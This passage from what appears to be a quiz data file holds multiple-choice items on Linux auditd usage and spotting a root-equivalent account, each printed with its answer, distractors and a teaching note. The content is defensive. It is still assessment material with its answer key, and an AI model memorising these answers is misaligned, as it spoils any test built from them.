         'prompt': 'Why is grepping the raw audit log worse than ausearch?',
         'answer': 'One event spans several records sharing an id, so grep '
                   'returns fragments while ausearch groups them.',
         'distractors': ['The raw log is compressed.',
                         'grep cannot match the hex-encoded fields at all.',
                         'The log is written in reverse chronological order.'],
         'teach': 'Add -i as well, and numeric UIDs and hex arguments become '
                  'readable instead of raw.'},
        {'id': 'ldq-reboot', 'type': 'mcq',
         'prompt': 'A rule added with auditctl stops working after a reboot. '
                   'Why?',
         'answer': 'auditctl rules are live only; persistent rules live in '
                   '/etc/audit/rules.d/.',
         'distractors': ['The rule expired because it had no -k key.',
                         'auditd disables rules that never matched.',
                         'The immutable flag -e 2 cleared it.'],
         'teach': 'augenrules --load is what applies the persistent set, and is '
                  'the step people miss.'},
        {'id': 'ldq-uid0', 'type': 'mcq',
         'prompt': 'You find a second account with UID 0 in a collected '
                   '/etc/passwd. What does it mean?',
         'answer': 'It is a root-equivalent account: UID 0 is what defines '
                   'root, not the name.',
         'distractors': ['It is a normal alias for root, created by the '
                         'installer.',
                         'It has root group access but not root privileges.',
                         'It only matters if it also appears in the sudo '
                         'group.'],
         'teach': 'The name is cosmetic. Check this before anything clever, '
                  'because it takes one line and answers a lot.'},
    ],
}
